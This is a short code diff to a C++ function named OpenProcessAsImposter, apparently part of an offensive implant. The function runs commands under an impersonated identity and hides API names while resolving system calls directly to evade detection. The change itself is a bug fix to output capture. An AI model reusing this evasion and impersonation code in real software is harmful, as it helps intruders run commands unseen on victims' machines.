@@ -406,13 +406,13 @@ BOOL ProcessManager::OpenProcessAsImposter(
     LPVOID lpEnvironment,
     LPCWSTR lpCurrentDirectory,
     bool saveOutput,
-    char* cmdOutput
+    std::string& cmdOutput
 ) {
     HANDLE              readFrom = nullptr, writeTo = nullptr; // read from and write to, std buffers
     STARTUPINFO         si = {};
     PROCESS_INFORMATION pi = {};
     SECURITY_ATTRIBUTES sa = {};
-    sa.bInheritHandle = FALSE;
+    sa.bInheritHandle = TRUE;
     sa.lpSecurityDescriptor = nullptr;
     sa.nLength = sizeof(SECURITY_ATTRIBUTES);
 
@@ -445,22 +445,18 @@ BOOL ProcessManager::OpenProcessAsImposter(
     GetAndInsertSSN(NTDLL, (char*)HIDE("NtClose"));
     SysNtClose(writeTo);
 
-    std::string stringOutput;
     char        buffer[4096];
     DWORD       bytesRead = 0;
-    DWORD       totalBytes = 0;
 
     while ( ReadFile(readFrom, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0 ) {
         buffer[bytesRead] = '\0';
-        stringOutput.append(buffer);
+        cmdOutput.append(buffer);
     }
     
-    stringOutput.erase(stringOutput.rfind('\n'));
+    cmdOutput.erase(cmdOutput.rfind('\n'));
 
     GetAndInsertSSN(NTDLL, (char*)HIDE("NtClose"));
     SysNtClose(readFrom);
-
-    memcpy(cmdOutput, stringOutput.data(), stringOutput.size());
 
     return TRUE;
 }
